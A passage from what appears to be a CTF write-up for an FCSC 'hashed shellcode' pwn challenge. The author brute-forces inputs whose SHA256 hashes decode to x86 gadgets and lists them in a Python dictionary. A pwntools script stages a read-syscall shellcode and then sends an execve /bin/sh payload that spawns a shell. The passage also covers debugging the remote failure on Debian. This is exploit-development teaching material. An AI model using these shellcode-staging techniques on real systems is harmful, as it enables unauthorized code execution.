+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    MAX_INPUT_LENGTH <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>    NUM_INPUTS <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>I managed to get one but it wasn&rsquo;t very usefull because I will need to have push r13 ; ret in every input hash.</p>
+<p>I didn&rsquo;t say it before, but it would be near impossible to have a valid hash that executes all we want, like a read() to put a free shellcode on the memory.</p>
+<p>So the first goal is to make program loop with changing chk variable to execute multiples different shellcodes.</p>
+<p>We have a pointer on it, which is rsi, so we could bruteforce the input hash which gives opcodes who change ptr [rsi] and ret. The goal is to have a chk variable negative to loop every time and could execute instructions, ret, send a new input, execute instructions, ret, &hellip;</p>
+<p>So here is a snippet of my code to look for qtr rsi set to a negative value :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disassemble_code</span>(code):
+</span></span><span style="display:flex;"><span>    disas <span style="color:#f92672">=</span> cs<span style="color:#f92672">.</span>disasm(code, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    syscall_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    rsi_chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    unvalid_mv <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;jmp&#34;</span>,<span style="color:#e6db74">&#34;call&#34;</span>,<span style="color:#e6db74">&#34;cmpsq&#34;</span>,<span style="color:#e6db74">&#34;push&#34;</span>,<span style="color:#e6db74">&#34;cmp&#34;</span>,<span style="color:#e6db74">&#34;test&#34;</span>]
+</span></span><span style="display:flex;"><span>    disassembly_output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ins <span style="color:#f92672">in</span> disas:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ins<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">in</span> BANNED_INSTRUCTIONS:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>,<span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        disassembly_output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (ins<span style="color:#f92672">.</span>address, ins<span style="color:#f92672">.</span>mnemonic, ins<span style="color:#f92672">.</span>op_str)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ins<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;sub&#39;</span> <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;qword ptr [rsi]&#34;</span> <span style="color:#f92672">in</span> ins<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">and</span> valid_mnemonic(ins<span style="color:#f92672">.</span>mnemonic,unvalid_mv) <span style="color:#f92672">and</span> ins<span style="color:#f92672">.</span>mnemonic[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;f&#34;</span>:
+</span></span><span style="display:flex;"><span>            rsi_chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> ins<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ret&#39;</span> <span style="color:#f92672">and</span> ins<span style="color:#f92672">.</span>op_str <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>            syscall_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    code_valid <span style="color:#f92672">=</span> syscall_found <span style="color:#f92672">and</span> rsi_chk
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> code_valid, disassembly_output
+</span></span></code></pre></div><p>I managed to find this instruction :</p>
+<pre tabindex="0"><code>Input: FCSC_81oA7cXbQ}\tS_X
+Hash SHA256: 0c294f4e2936f8010ec32efbdc815dbcff6c705d8d570411e7560e50a9635fa2
+Disassembled Output:
+0x0:    or      al, 0x29
+0x2:    sub     qword ptr [rsi], r14
+0x6:    clc
+0x7:    add     dword ptr [rsi], ecx
+0x9:    ret
+</code></pre><p>It allows to set chk to a negative value and loop again and again. It allows us to now search input without the constraints of the binary because the chk will always be negative.</p>
+<p>Now we need to find a way to put a shellcode and execute it. We are going to search for short instructions to have more chance to find some. We could use <code>jmp</code> instructions which will do a relative jump to jump on our shellcode when the memory will be setup.</p>
+<p>I decided to use instructions <code>inc byte ptr [rsi + 0xXX] ; ret</code> to write my shellcode. I need to find hash result which gives these two instructions with rsi add value next to each other.</p>
+<p>So I take my dirty scripts to search for them, run it multiple times and start to make a list.</p>
+<p>I had many instructions like this :</p>
+<pre tabindex="0"><code>Input:  b&#39;&lt;\x9fj[\xf1Sg\xb85\xca\x95\xe3\xed\xec\xca\x82&#34;\xe1\x07&lt;&#39;
+Hash SHA256: fe460cc3f28920f29f79a6b3c402608c0a0ff22726a2add83bd0760069ae3344
+Disassembled Output:
+0x0:    inc     byte ptr [rsi + 0xc]
+0x3:    ret
+
+
+Input:  b&#39;\xc9\x9d\x0f\xfd\xd0\x970\xc6\xfc\x16\xbb\xcd\x84H&lt;\xbc\xff\xe6\xd8&gt;&#39;
+Hash SHA256: 333ffe460f9fc3847614606895328180262b19103902c3bb1f455ce9802ebc0d
+Disassembled Output:
+0x0:    xor     edi, dword ptr [rdi]
+0x2:    inc     byte ptr [rsi + 0xf]
+0x5:    lahf
+0x6:    ret
+
+Input:  b&#39;*R\xd7&#34;\x15=\x1c\xc2\xe3%\xce\xcd\xe1\xb9b.X%nJ&#39;
+Hash SHA256: fe4626c3b99e3ab9957454ef867a7cd9e264c02db6061798a05268154fe7c104
+Disassembled Output:
+0x0:    inc     byte ptr [rsi + 0x26]
+0x3:    ret
+</code></pre><p>So I made a dictionnary in python with all of them :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>dic <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xa</span> : <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x15</span><span style="color:#e6db74">w</span><span style="color:#ae81ff">\xd2</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">k;</span><span style="color:#ae81ff">\xb1\xba\x08\x1c</span><span style="color:#e6db74">j</span><span style="color:#ae81ff">\x91\xeb</span><span style="color:#e6db74">h</span><span style="color:#ae81ff">\xbe</span><span style="color:#e6db74">T~</span><span style="color:#ae81ff">\xed</span><span style="color:#e6db74">C&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xc</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;</span><span style="color:#ae81ff">\x9f</span><span style="color:#e6db74">j[</span><span style="color:#ae81ff">\xf1</span><span style="color:#e6db74">Sg</span><span style="color:#ae81ff">\xb8</span><span style="color:#e6db74">5</span><span style="color:#ae81ff">\xca\x95\xe3\xed\xec\xca\x82</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\x07</span><span style="color:#e6db74">&lt;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xf</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc9\x9d\x0f\xfd\xd0\x97</span><span style="color:#e6db74">0</span><span style="color:#ae81ff">\xc6\xfc\x16\xbb\xcd\x84</span><span style="color:#e6db74">H&lt;</span><span style="color:#ae81ff">\xbc\xff\xe6\xd8</span><span style="color:#e6db74">&gt;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x14</span> : <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb9</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\xf0\xd8\x06</span><span style="color:#e6db74">C7</span><span style="color:#ae81ff">\x11\xb8\xa5</span><span style="color:#e6db74">2vSea!</span><span style="color:#ae81ff">\xd1</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">H&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x15</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb6</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\xa8</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\xdf\xc1\xd5\xaf\xba</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\xf4</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\x98</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\xb8\xb4\xdf</span><span style="color:#e6db74">@</span><span style="color:#ae81ff">\xe6\xfa</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x17</span> : <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x86</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\x1f\x8a</span><span style="color:#e6db74">b</span><span style="color:#ae81ff">\xd5</span><span style="color:#e6db74">v</span><span style="color:#ae81ff">\x89\xf1</span><span style="color:#e6db74">bFU</span><span style="color:#ae81ff">\xe9\x7f\xaa</span><span style="color:#e6db74">cLl4</span><span style="color:#ae81ff">\xf6</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x18</span> : <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:&gt;&#34;</span><span style="color:#ae81ff">\x19\x80</span><span style="color:#e6db74">B </span><span style="color:#ae81ff">\xde\x8b\xa1\x13\xc7</span><span style="color:#e6db74">B</span><span style="color:#ae81ff">\xa0</span><span style="color:#e6db74">mi</span><span style="color:#ae81ff">\x08</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\x1e\xe0</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x1a</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;9</span><span style="color:#ae81ff">\x84\x0b\t\xa9</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\xdd</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xd1</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\xad\xaf\xac\x96</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\xd1</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\xe6\xf9\xca</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x1c</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0c\xc0\x9f</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\\\x1f\xc4\xe4\xdc\x01\x08\xc3\xf6\x8d</span><span style="color:#e6db74">JY</span><span style="color:#ae81ff">\xb9\x97\x90\xaf</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x1d</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xd3\x18</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x18\x93\x9a</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\xad</span><span style="color:#e6db74">&amp;</span><span style="color:#ae81ff">\xc7</span><span style="color:#e6db74">w</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\xf3\xc8\xdf</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\xb3\x1e</span><span style="color:#e6db74">D&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x1f</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x13\xd1\xaa</span><span style="color:#e6db74">x</span><span style="color:#ae81ff">\x95\x89\x83\xb5</span><span style="color:#e6db74">*</span><span style="color:#ae81ff">\xbb\x9a\x85</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\xf9\xd2</span><span style="color:#e6db74">RW&#34;g3&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x20</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)3</span><span style="color:#ae81ff">\xec\xbb</span><span style="color:#e6db74">t|</span><span style="color:#ae81ff">\x98\xba</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\x8d\xa3\x1f\xd9\xef</span><span style="color:#e6db74">]s#v</span><span style="color:#ae81ff">\xf5\xbc</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x21</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[</span><span style="color:#ae81ff">\xc4</span><span style="color:#e6db74">b</span><span style="color:#ae81ff">\xa5</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\xae\x92</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\xf0</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb1</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\xbc</span><span style="color:#e6db74">.&lt;#</span><span style="color:#ae81ff">\x14\x9f\xb6\x11</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x23</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;?A[</span><span style="color:#ae81ff">\x96</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\x84\xe8</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x0c\x9a\xc2</span><span style="color:#e6db74">*%</span><span style="color:#ae81ff">\xfb\xd6\xe0\xfa\xeb\x96</span><span style="color:#e6db74">&#34;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x26</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;*R</span><span style="color:#ae81ff">\xd7</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x15</span><span style="color:#e6db74">=</span><span style="color:#ae81ff">\x1c\xc2\xe3</span><span style="color:#e6db74">%</span><span style="color:#ae81ff">\xce\xcd\xe1\xb9</span><span style="color:#e6db74">b.X%nJ&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x27</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc8\xbe\x84\xd6\x93\x14\xbd\xd1</span><span style="color:#e6db74">8-b</span><span style="color:#ae81ff">\xdf\x1d\x07\xda</span><span style="color:#e6db74">C</span><span style="color:#ae81ff">\xf3</span><span style="color:#e6db74">,s</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x28</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;w</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">aN</span><span style="color:#ae81ff">\xf7</span><span style="color:#e6db74">B</span><span style="color:#ae81ff">\xa0</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\n\xe8\xfc\xfc</span><span style="color:#e6db74">S</span><span style="color:#ae81ff">\x8f</span><span style="color:#e6db74">6(</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">{O</span><span style="color:#ae81ff">\xfd</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x29</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xae\xbd\x89\xa7</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\xb0\xf4\x1d\xa5\xbc\x1c</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xdf</span><span style="color:#e6db74">B8</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">v</span><span style="color:#ae81ff">\xcb\xdc\xef</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x2a</span> : <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc5\xad</span><span style="color:#e6db74">@iv</span><span style="color:#ae81ff">\xc6</span><span style="color:#e6db74">U</span><span style="color:#ae81ff">\xe1\x95\x8e\xdd</span><span style="color:#e6db74">z</span><span style="color:#ae81ff">\x9b\xdc\xe5\x19</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\xaf</span><span style="color:#e6db74">${&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x2b</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb4\xde\xba</span><span style="color:#e6db74">66</span><span style="color:#ae81ff">\xe3</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x82</span><span style="color:#e6db74">S</span><span style="color:#ae81ff">\x98\x18\xa5\xa3</span><span style="color:#e6db74">M</span><span style="color:#ae81ff">\x9e\x0c\xba\xaf\x10\xd9</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x2c</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xd3\xf8\x1e\xcc\x1d\x50\xc6\x93\x1b\xc0\xb0\xd1\xd2\xef\xb8\xfb\xe4\xf9\x05\x07\x25\x58\x2c\x52\x9a\xfe\x56\xa5\x06</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x2d</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xaf\xa4\x2d\xc3\xf6\x7e\x82\xd6\xfd\xae\x58\xa6\x20\x8f\x45\x9f\xf9\xac\xe4\xb5\x26\xa1\x75\x26\x34\x3c\xe3\x93\x44</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x2e</span> : <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xa4\xd7\x21\x2f\xa2\xa9\x64\x86\xa3</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x2f</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x04</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\xd7</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\x14</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xdf\xf0</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\xe1</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\xe4\xe5</span><span style="color:#e6db74">8</span><span style="color:#ae81ff">\xcd\x1c</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\xe9\x08\xf8</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>For each line, we have the input, which increment rsi+key of one.</p>
+<p>Now we have all we need to set up the shellcode we want and jump on it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># [...]</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor edi, edi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov edx, 0x500
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ret
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode_bytes <span style="color:#f92672">=</span> asm(shellcode)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Len shellcode&#34;</span>,len(shellcode_bytes))
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,reset_buf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x26</span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> shellcode_bytes:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">!=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(int(i)):
+</span></span><span style="display:flex;"><span>            sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dic[base<span style="color:#f92672">+</span>n] )
+</span></span><span style="display:flex;"><span>            sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,reset_buf_sub)
+</span></span><span style="display:flex;"><span>    n<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jmp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x36\x02\x81\x99\x25\x07\xbb\x16\xc1\x7f\x27\x09\xd5\x80\x01\x37\xc7\x2a\x56\xaa\x79\x3e\xd7\x15\xcd\xae\x89\x6d\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,jmp)
+</span></span></code></pre></div><p>So we generate our shellcode with pwntools, and for each shellcode byte, we will increment the value as much as the shellcode byte value.</p>
+<p>The shellcode is xoring rsi to have FD = 0, set edx at a coherent value for the read syscall and rax is already at 0 so no problem.</p>
+<p>We bruteforce with a C program the jmp instruction hash and send it to jump on our shellcode.</p>
+<p>Next, we send to the read call our shellcode execve(&quot;/bin/sh&quot;,0,0) :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>shellcode_sh <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>last_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> shellcode_sh <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcc</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>sl(last_shellcode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/hashed_shellcode/2.png" alt=""></p>
+<p>We get a <strong>local</strong> shell, <strong>local</strong>.</p>
+<p>Because yes, when I send the exploit in remote It crashes instantly. I was wondering why but looks weird.</p>
+<p>Then I executed my exploit on another machine, which is a Debian, and it crashes. Load the exploit in gdb and crash at the first shellcode.</p>
+<p><img src="/img/hashed_shellcode/3.png" alt=""></p>
+<p>RSI equals 0, it wasn&rsquo;t the case on the machine I debug and developed the exploit, there is a difference.</p>
+<p>I quickly managed to view the problem. The calls of the sha256 library (libcrypto.so.3) setup rsi to chk address (after the hash result) in ubuntu 22, but not in Debian, in Debian, those registers are set to 0, so my exploit can&rsquo;t work, and all my constraints and inputs found where based on rsi :-).</p>
+<p>The library codes are different, but they were not given, and we had no information about the remote machine so it was impossible to guess this behaviour. Later on the competition, the admins decided to release information about the challenge which is :</p>
+<blockquote>
+<p>the Docker base image on the remote service is debian:bookworm-slim.</p>
+</blockquote>
+<p>It was a small mistake, but no problem. The idea of the exploit is there, and it&rsquo;s an opportunity to optimize the resolution because my dirty python script is very slow.</p>
+<h3 id="remote-exploit">Remote exploit</h3>
+<p>I get the Debian library and patch my local binary. Let&rsquo;s view the register context again :
+<img src="/img/hashed_shellcode/4.png" alt=""></p>
+<p>No more rsi on the chk variable, we know it, we are going to find instructions with rsi only because his value is the nearest of the chk variable with is 0x20 bytes after it.</p>
+<p>To set chk to a negative value, we could use the <code>dec</code> instruction which on chk variable last bit (which equals 0), is going to be 0xff, and with it, chk become negative and we could loop to the program.</p>
+<p>Here is the C script :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;openssl/sha.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_INPUT_LENGTH 32
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">calculate_sha256</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> data_len, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>hash) {
+</span></span><span style="display:flex;"><span>    SHA256_CTX sha256_ctx;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256_Init</span>(<span style="color:#f92672">&amp;</span>sha256_ctx);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256_Update</span>(<span style="color:#f92672">&amp;</span>sha256_ctx, data, data_len);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256_Final</span>(hash, <span style="color:#f92672">&amp;</span>sha256_ctx);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">generate_random_input</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> charset[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`abcdefghijklmnopqrstuvwxyz{|}&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">size_t</span> charset_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(charset);
